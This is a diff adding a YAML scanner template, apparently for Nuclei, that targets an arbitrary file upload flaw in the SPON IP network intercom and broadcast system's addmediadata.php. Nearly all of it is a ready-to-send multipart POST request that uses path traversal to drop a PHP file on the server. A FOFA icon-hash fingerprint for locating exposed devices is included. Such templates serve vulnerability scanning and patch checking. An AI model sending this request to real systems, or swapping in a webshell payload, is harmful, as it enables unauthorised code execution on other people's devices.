@@ -1,0 +1,60 @@
+id: poc-vs7urggp4m7f3pn4
+info:
+  name: 世邦通信 SPON IP网络对讲广播系统 addmediadata.php 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vs7urggp4m7f3pn4'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vs7urggp4m7f3pn4
+    fofa: icon_hash="-1830859634"
+http:
+- raw:
+  - 'POST /php/addmediadata.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16
+
+    Content-Length: 514
+
+    Content-Type: multipart/form-data; boundary=de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: close
+
+
+    --de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
+
+    Content-Disposition: form-data; name="fullpath"
+
+
+    ../
+
+    --de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
+
+    Content-Disposition: form-data; name="subpath"
+
+
+    /
+
+    --de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828
+
+    Content-Disposition: form-data; name="file"; filename="test.php"
+
+    Content-Type: application/octet-stream
+
+
+    <?php echo md5(1);unlink(__FILE__);?>
+
+    --de3b7a45ced9f35720e192ff54eb83908644f0ec70b3dc6fb19b6b5f0828--
+
+
+    访问路径：[http://127.0.0.1/test.php](http://127.0.0.1/test.php)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
